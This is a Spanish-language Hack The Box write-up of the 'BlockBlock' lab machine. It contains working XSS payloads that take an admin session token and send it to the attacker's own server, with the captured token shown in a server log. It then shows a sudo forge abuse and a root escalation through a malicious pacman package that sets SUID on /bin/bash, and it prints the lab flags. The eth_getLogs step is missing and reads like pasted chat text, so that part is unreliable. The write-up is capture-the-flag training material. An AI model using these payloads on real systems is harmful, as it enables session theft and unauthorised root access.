---
layout: single
title: blockblock - Hack The Box
excerpt: "Se encuentra un servicio JSON-RPC expuesto en el puerto 8545. Se interactúa con la API para obtener credenciales o acceso a un contrato inteligente mal configurado. Se explota la lógica del contrato para ejecutar comandos en el sistema y obtener una shell inicial. Finalmente, se identifican privilegios elevados en el sistema y se abusa de configuraciones incorrectas para escalar a root."
date: 2020-09-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-blockblock/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - xss
  - eth-getlogs
  - re-bashh-shell
---

![](/assets/images/htb-writeup-blockblock/portada.png)

Se encuentra un servicio JSON-RPC expuesto en el puerto 8545. Se interactúa con la API para obtener credenciales o acceso a un contrato inteligente mal configurado. Se explota la lógica del contrato para ejecutar comandos en el sistema y obtener una shell inicial. Finalmente, se identifican privilegios elevados en el sistema y se abusa de configuraciones incorrectas para escalar a root.

## Portscan

```
nmap -Pn -p- --min-rate 2000 -sC -sV -oN scan 10.10.11.43
Nmap scan report for 10.129.179.129
Host is up (0.089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Tue, 19 Nov 2024 20:17:54 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 275864
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     Home - DBLC
|     </title>
|     <link rel="stylesheet" href="/assets/nav-bar.css">
|     </head>
|     <body>
|     <!-- <main> -->
|     <meta charset=utf-8>
|     <meta name=viewport content="width=device-width, initial-scale=1">
|     <style>
|     :after,
|     :before {
|     box-sizing: border-box;
|     border: 0 solid #e5e7eb
|     :after,
|     :before {
|     --tw-content: ""
|     :host,
|     html {
|     line-height: 1.5;
|   HTTPOptions: 
|     HTTP/1.1 500 INTERNAL SERVER ERROR
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Tue, 19 Nov 2024 20:17:54 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 265
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>500 Internal Server Error</title>
|     <h1>Internal Server Error</h1>
|_    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
|_http-title:          Home  - DBLC    
8545/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 BAD REQUEST
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Tue, 19 Nov 2024 20:17:54 GMT
|     content-type: text/plain; charset=utf-8
|     Content-Length: 43
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-origin: *
|     date: Tue, 19 Nov 2024 20:17:54 GMT
|     Connection: close
|     Connection header did not include 'upgrade'
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Tue, 19 Nov 2024 20:17:54 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, POST, HEAD
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Connection: close
|   Help: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

```

vemos una pagina y nos podemos logear

![](/assets/images/htb-writeup-blockblock/login.png)

nos registramos

![](/assets/images/htb-writeup-blockblock/login2.png)


![](/assets/images/htb-writeup-blockblock/xss.png)



parece que alguien recibe los mesanjes si le doy en `report user`

![](/assets/images/htb-writeup-blockblock/xss2.png)



es mas que evidente que es esta maquina se puede compromer la seguridad con `xss`


https://book.hacktricks.wiki/en/index.html

aqui dejo como lo hice


```
   1   │  cat 2.js
   2   │ fetch('http://10.10.11.43/api/info').then(response =>{return response.json();}).th
       │ en(dataFromA =>{return fetch('http://kali-ip',{method:'POST',headers:{'Content-Typ
       │ e':'application/json'},body: JSON.stringify(dataFromA)});}).then(responseToB =>{re
       │ turn responseToB.text();})
   3   │                                                                                   
       │                                                                                                                    
       │                                         
   7   │ ┌──(noesholk㉿noes)-[~]
   8   │ └─$ You said:
   9   │ <img src=x onerror="fetch('https://kali-ip:83/api/data', {headers: {'Content-Type'
       │ :'application/x -www-form-urlencoded'}}).then(response => response.text()).then(da
       │ ta => console.log(data)).catch(error => console.error('Error:', error));">
  21   │ <img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return 
       │ response.text();}).then(dataFromA => {return fetch(http://kali-ip:84/?d=${dataFrom
       │ A})})">
       │                                         
  40   │ ┌──(noesholk㉿noes)-[~]
  41   │ └─$ <img src="xonefror" onerror="var script = document.createElement('script');
  42   │ 
  43   │ script.src = 'http://10.10.16.28/script.js';
  44   │ document.body.appendChild(script);" />
  45   │                                                                                   
       │                                         
  46   │ ┌──(noesholk㉿noes)-[~]
  47   │ └─$ cat 3|  
  48   │ pipe> 
  49   │                                                                                   
       │                                         
  50   │ ┌──(noesholk㉿noes)-[~]
  51   │ └─$ cat 3.js 
  52   │ fetch('/api/info').then(response => response.text()).then(text => {
  53   │ 
  54   │         fetch('http://10.10.15.64/log?'+ btoa(text), {
  55   │ 
  56   │                 mode: 'no-cors'
  57   │ 
  58   │         });
  59   │ 
  60   │ })
  61   │                                                                                   
       │                                         
  62   │ ┌──(noesholk㉿noes)-[~]
  63   │ └─$ <img src="xonefror" onerror="var script = document.createElement('script');
  64   │ script.src = 'http://10.10.15.64/3.js';     
  65   │ document.body.appendChild(script);" />
  66   │ zsh: parse error near `\n'
```

estos son los comandos que utilize


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ python3 -m http.server 80
   3   │ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   4   │ 10.10.11.43 - - [07/Feb/2025 19:33:20] "GET /1.js? HTTP/1.1" 200 -
   5   │ 10.10.11.43 - - [07/Feb/2025 19:33:50] "GET /1.js? HTTP/1.1" 200 -
   6   │ -10.10.11.43 - - [07/Feb/2025 19:59:30] "GET /1.js? HTTP/1.1" 200 -
   7   │ 10.10.11.43 - - [07/Feb/2025 20:31:16] "GET /3.js HTTP/1.1" 200 -
   8   │ 10.10.11.43 - - [07/Feb/2025 20:31:16] code 404, message File not found
   9   │ 10.10.11.43 - - [07/Feb/2025 20:31:16] "GET /log?eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6I
       │ mV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUptY21WemFDSTZabUZzYzJVc0ltbGh
       │ kQ0k2TVRjek9EazJNREkzTml3aWFuUnBJam9pWkRRMU1qSm1aRGN0TWprNU55MDBOVEJsTFdKbE9XTXRZe
       │ lJtTlRWaFlqYzNPRFJpSWl3aWRIbHdaU0k2SW1GalkyVnpjeUlzSW5OMVlpSTZJbUZrYldsdUlpd2libUp
       │ tSWpveE56TTRPVFl3TWpjMkxDSmxlSEFpT2pFM016azFOalV3TnpaOS5mVDRrdUhkdkZpVUYtdFoxYWNCW
       │ WhfblVwMFk5Y2xKNk5WNk91eTYwdFZVIiwidXNlcm5hbWUiOiJhZG1pbiJ9Cg== HTTP/1.1" 404
```

ya que capturamos la cookie de sesion la ponemos en la pagina para estar logeado al parecer keira
- ojo que esta en base64 asi es que de codifiquenlo


![](/assets/images/htb-writeup-blockblock/admin.png)

## eth_getLogs

no subi el retos ya que no guarde las capturas pero en resumen
- El endpoint eth_getLogs en la API de Ethereum permite recuperar eventos registrados en la blockchain. Si usaste este método en BlockBlock, es probable que hayas filtrado logs de contratos inteligentes en busca de credenciales expuestas o direcciones clave.

- Si recuerdas qué filtro aplicaste (como dirección del contrato o tópicos específicos), podemos reconstruir el proceso exacto con el que obtuviste la contraseña de Keira.




```
  95   │ ┌──(noesholk㉿noes)-[~]
  96   │ └─$ ssh keira@DBLC.htb
  97   │ The authenticity of host 'dblc.htb (10.10.11.43)' can't be established.
  98   │ ED25519 key fingerprint is SHA256:Yxhk4seV11xMS6Vp0pPoLicen3kJ7RAkXssZiL2/t3c.
  99   │ This key is not known by any other names.
 100   │ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 101   │ Warning: Permanently added 'dblc.htb' (ED25519) to the list of known hosts.
 102   │ keira@dblc.htb's password: 
 103   │ Last login: Mon Nov 18 16:50:13 2024 from 10.10.14.23
 104   │ [keira@blockblock ~]$ ls
 105   │ reverse-proxy  user.txt  webapp
 106   │ [keira@blockblock ~]$ cat user.txt
 107   │ 953622aae6f7e18001b05d0d4d23a5b1
 108   │ [keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge
 109   │ Build, test, fuzz, debug and deploy Solidity contracts
 110   │ 
 111   │ Usage: forge <COMMAND>
 112   │ 
 113   │ Commands:
 114   │   bind               Generate Rust bindings for smart contracts
 115   │   build              Build the project's smart contracts [aliases: b, compile]
 116   │   cache              Manage the Foundry cache
 117   │   clean              Remove the build artifacts and cache directories [aliases: cl
       │ ]
 118   │   clone              Clone a contract from Etherscan
 119   │   completions        Generate shell completions script [aliases: com]
 120   │   config             Display the current config [aliases: co]
 121   │   coverage           Generate coverage reports
 122   │   create             Deploy a smart contract [aliases: c]
 123   │   debug              Debugs a single smart contract as a script [aliases: d]
 124   │   doc                Generate documentation for the project
 125   │   flatten            Flatten a source file and all of its imports into one file [a
       │ liases: f]
 126   │   fmt                Format Solidity source files
 127   │   geiger             Detects usage of unsafe cheat codes in a project and its depe
       │ ndencies
 128   │   generate           Generate scaffold files
 129   │   generate-fig-spec  Generate Fig autocompletion spec [aliases: fig]
 130   │   help               Print this message or the help of the given subcommand(s)
 131   │   init               Create a new Forge project
 132   │   inspect            Get specialized information about a smart contract [aliases: 
       │ in]
 133   │   install            Install one or multiple dependencies [aliases: i]
 134   │   remappings         Get the automatically inferred remappings for the project [al
       │ iases: re]
 135   │   remove             Remove one or multiple dependencies [aliases: rm]
 136   │   script             Run a smart contract as a script, building transactions that 
       │ can be sent onchain
 137   │   selectors          Function selector utilities [aliases: se]
 138   │   snapshot           Create a snapshot of each test's gas usage [aliases: s]
 139   │   test               Run the project's tests [aliases: t]
 140   │   tree               Display a tree visualization of the project's dependency grap
       │ h [aliases: tr]
 141   │   update             Update one or multiple dependencies [aliases: u]
 142   │   verify-bytecode    Verify the deployed bytecode against its source [aliases: vb]
 143   │   verify-check       Check verification status on Etherscan [aliases: vc]
 144   │   verify-contract    Verify smart contracts on Etherscan [aliases: v]
 145   │ 
 146   │ Options:
 147   │   -h, --help     Print help
 148   │   -V, --version  Print version
 149   │ 
 150   │ Find more information in the book: http://book.getfoundry.sh/reference/forge/forge
       │ .html
 151   │ [keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge init /tmp/mm --no
       │ -git --offline
 152   │ Initializing /tmp/mm...
 153   │     Initialized forge project
 154   │ [keira@blockblock ~]$ cd /tmp
 155   │ [keira@blockblock tmp]$ ls
 156   │ mm
 157   │ [keira@blockblock tmp]$ nano shell.sh
 158   │ [keira@blockblock tmp]$ chmod 777 shell.sh
 159   │ [keira@blockblock tmp]$ sudo -u paul /home/paul/.foundry/bin/forge build --use ./s
       │ hell.sh
```



```
   1   │ [paul@blockblock tmp]$ ls
   2   │ ls
   3   │ [paul@blockblock tmp]$ echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ni
       │ nstall=exp.install" > PKGBUILD
   4   │ echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > P
       │ KGBUILD
   5   │ [paul@blockblock tmp]$ kgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > P
       │ KGBUILD
   6   │ kgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > PKGBUILD
   7   │ bash: syntax error near unexpected token `('
   8   │ [paul@blockblock tmp]$ kgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > P
       │ KGBUILD
   9   │ kgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > PKGBUILD
  10   │ bash: syntax error near unexpected token `('
  11   │ [paul@blockblock tmp]$ script /devnull -c bash
  12   │ script /devnull -c bash
  13   │ Script started, output log file is '/devnull'.
  14   │ script: cannot open /devnull: Permission denied
  15   │ Script done.
  16   │ [paul@blockblock tmp]$ ls      
  17   │ ls
  18   │ [paul@blockblock tmp]$ ls
  19   │ ls
  20   │ [paul@blockblock tmp]$ echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ni
       │ nstall=exp.install" > PKGBUILD
  21   │ echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > P
       │ KGBUILD
  22   │ [paul@blockblock tmp]$ echo "post_install() { chmod 4777 /bin/bash; }" > exp.insta
       │ ll
  23   │ echo "post_install() { chmod 4777 /bin/bash; }" > exp.install
  24   │ [paul@blockblock tmp]$ ls
  25   │ ls
  26   │ exp.install
  27   │ PKGBUILD
  28   │ [paul@blockblock tmp]$ cat exp.install
  29   │ cat exp.install
  30   │ post_install() { chmod 4777 /bin/bash; }
  31   │ [paul@blockblock tmp]$ cat PKGBUILD
  32   │ cat PKGBUILD
  33   │ pkgname=exp
  34   │ pkgver=1.0
  35   │ pkgrel=1
  36   │ arch=('any')
  37   │ install=exp.install
  38   │ [paul@blockblock tmp]$ ^[[A
  39   │ cat PKGBUILD
  40   │ pkgname=exp
  41   │ pkgver=1.0
  42   │ pkgrel=1
  43   │ arch=('any')
  44   │ install=exp.install
  45   │ [paul@blockblock tmp]$ ^[[A
  46   │ cat PKGBUILD
  47   │ pkgname=exp
  48   │ pkgver=1.0
  49   │ pkgrel=1
  50   │ arch=('any')
  51   │ install=exp.install
  52   │ [paul@blockblock tmp]$ makepkg -s
  53   │ makepkg -s
  54   │ ==> Making package: exp 1.0-1 (Fri 07 Feb 2025 10:35:44 PM UTC)
  55   │ ==> Checking runtime dependencies...
  56   │ ==> Checking buildtime dependencies...
  57   │ ==> Retrieving sources...
  58   │ ==> Extracting sources...
  59   │ ==> Entering fakeroot environment...
  60   │ ==> Tidying install...
  61   │   -> Removing libtool files...
  62   │   -> Purging unwanted files...
  63   │   -> Removing static library files...
  64   │   -> Stripping unneeded symbols from binaries and libraries...
  65   │   -> Compressing man and info pages...
  66   │ ==> Checking for packaging issues...
  67   │ ==> Creating package "exp"...
  68   │   -> Generating .PKGINFO file...
  69   │   -> Generating .BUILDINFO file...
  70   │   -> Adding install file...
  71   │   -> Generating .MTREE file...
  72   │   -> Compressing package...
  73   │ ==> Leaving fakeroot environment.
  74   │ ==> Finished making: exp 1.0-1 (Fri 07 Feb 2025 10:35:47 PM UTC)
  75   │ [paul@blockblock tmp]$ ls
  76   │ ls
  77   │ exp-1.0-1-any.pkg.tar.zst
  78   │ exp.install
  79   │ pkg
  80   │ PKGBUILD
  81   │ src
  82   │ [paul@blockblock tmp]$ chmod +x exp-1.0-1-any.pkg.tar.zst
  83   │ chmod +x exp-1.0-1-any.pkg.tar.zst
  84   │ [paul@blockblock tmp]$ sudo pacman -U exp-1.0-1-any.pkg.tar.zst
  85   │ sudo pacman -U exp-1.0-1-any.pkg.tar.zst
  86   │ loading packages...
  87   │ resolving dependencies...
  88   │ looking for conflicting packages...
  89   │ 
  90   │ Packages (1) exp-1.0-1
  91   │ 
  92   │ 
  93   │ :: Proceed with installation? [Y/n] y
  94   │ y
  95   │ checking keyring...
  96   │ checking package integrity...
  97   │ loading package files...
  98   │ checking for file conflicts...
  99   │ checking available disk space...
 100   │ :: Processing package changes...
 101   │ installing exp...
 102   │ [paul@blockblock tmp]$ bash -p
 103   │ bash -p
 104   │ ls
 105   │ exp-1.0-1-any.pkg.tar.zst
 106   │ exp.install
 107   │ pkg
 108   │ PKGBUILD
 109   │ src
 110   │ pwd
 111   │ /tmp
 112   │ id
 113   │ uid=1001(paul) gid=1001(paul) euid=0(root) groups=1001(paul)
 114   │ cd /root
 115   │ ls
 116   │ root.txt
 117   │ scripts
 118   │ cat root.txt
 119   │ 5be0da5f408e73feb721c0df63f946af
 120   │ 
 121   │ [1]+  Stopped                 bash -p
 122   │ [paul@blockblock tmp]$
```
